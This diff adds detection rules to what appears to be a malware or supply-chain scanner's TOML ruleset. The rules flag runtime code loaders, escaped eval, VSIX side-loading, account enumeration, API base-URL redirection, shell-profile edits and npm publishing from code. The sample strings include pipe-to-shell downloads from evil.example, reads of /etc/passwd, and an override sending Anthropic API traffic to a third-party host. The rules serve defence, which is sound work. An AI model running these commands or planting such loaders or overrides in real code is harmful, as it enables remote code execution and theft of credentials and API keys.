@@ -674,3 +674,78 @@ description = "Fetches a remote script and pipes it straight into an interpreter
 pattern = '''(?i)(?:^|[^a-z])(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)(?:\s|\\x20)+[^|\n]{0,200}?https?://[^|\n]{0,200}?\|(?:\s|\\x20)*(?:iex|Invoke-Expression|sh|bash|zsh|python3?|node)\b'''
 matches = ['''powershell -Command "irm https://evil.example/a | iex"''', '''powershell\x20-Command\x20\x22irm\x20https://e.x/a\x20|\x20iex\x22''', '''curl -fsSL https://get.example.sh | sh''']
 ignores = ['''curl -o out.zip https://example.com/a.zip''']
+
+# Hands `require` to code built at runtime: the loader half of a
+# fetch-and-run backdoor (chai-as-validated, tailwindcss-forms-component).
+[[rule]]
+id = "KS-EXE-026"
+name = "Function Constructor with require"
+severity = "high"
+category = "obfuscation"
+description = "new Function('require', code): dynamic code execution with module access"
+pattern = '''(?:\bnew\s+Function|\bFunction\.constructor)\s*\(\s*["'`]require["'`]'''
+matches = ['''const h = new Function.constructor("require", s);''', '''new Function(
+  'require', 'module', data.credits)''']
+ignores = ['''new Function("return this")()''']
+
+# BlankOBF and friends spell `eval` / `compile` as escapes so grep misses them.
+[[rule]]
+id = "KS-EXE-027"
+name = "Escaped eval Payload"
+severity = "high"
+category = "obfuscation"
+description = "eval/exec/compile of a fully escaped string literal: obfuscated dynamic code"
+pattern = '''\b(?:eval|exec|compile)\s*\(\s*["']\\(?:x[0-9a-fA-F]{2}|[0-7]{3})'''
+matches = ['''_____=eval("\145\x76\x61\x6c")''']
+ignores = ['''eval("1+1")''', '''re.compile("\\d+")''']
+
+# Marketplace extensions install by id; a Uri means a VSIX fetched from elsewhere.
+[[rule]]
+id = "KS-SUP-010"
+name = "VS Code Extension Side-loading"
+severity = "high"
+category = "supply_chain"
+description = "Installs a VSIX file from outside the marketplace (supply chain side-loading)"
+pattern = '''workbench\.extensions\.installExtension["'`]\s*,\s*[^"'`\s]'''
+matches = ['''executeCommand('workbench.extensions.installExtension', uri)''']
+ignores = ['''executeCommand('workbench.extensions.installExtension', 'ms-python.python')''']
+
+[[rule]]
+id = "KS-REC-003"
+name = "Account Enumeration Command"
+severity = "medium"
+category = "recon"
+description = "Enumerates local users, groups or privileges (system discovery reconnaissance)"
+pattern = '''(?i)\b(?:net\s+(?:user|localgroup)\b|whoami\s+/(?:priv|all|groups)\b|cat\s+/etc/(?:passwd|shadow)\b|dscl\s+\.\s+-?list\s+/Users\b)'''
+matches = ['''execSync('whoami /priv')''', '''execSync('cat /etc/passwd')''']
+ignores = ['''path.join(root, '../../etc/passwd')''']
+
+# https only: local routers (claude-code-router, LiteLLM) point at http://127.0.0.1.
+[[rule]]
+id = "KS-EXF-016"
+name = "AI API Base URL Override"
+severity = "medium"
+category = "exfiltration"
+description = "Redirects Anthropic/OpenAI API traffic (and the API key) to a third-party host"
+pattern = '''(?:ANTHROPIC_BASE_URL|OPENAI_BASE_URL|OPENAI_API_BASE)["']?\s*[:=]\s*["'`]https://'''
+matches = ['''ANTHROPIC_BASE_URL: "https://new.aicode.us.com"''']
+ignores = ['''ANTHROPIC_BASE_URL: "http://127.0.0.1:3456"''']
+
+[[rule]]
+id = "KS-FSW-002"
+name = "Shell Profile Modification"
+severity = "medium"
+category = "file_write"
+description = "Touches shell startup files (.bashrc / .zshrc / .bash_profile): persistence"
+pattern = '''\.(?:bashrc|zshrc|bash_profile)\b'''
+matches = ['''path.join(homeDir, '.zshrc')''']
+
+[[rule]]
+id = "KS-SUP-011"
+name = "npm Publish from Code"
+severity = "medium"
+category = "supply_chain"
+description = "Runs `npm publish` from a script (release tooling, or a registry spam publisher)"
+pattern = '''\b(?:exec|execSync|spawn|spawnSync|execa)\s*\(\s*["'`]npm\s+publish\b'''
+matches = ['''exec('npm publish --access public', (error) => {''']
+ignores = ['''execa('npm', ['publish'])''']
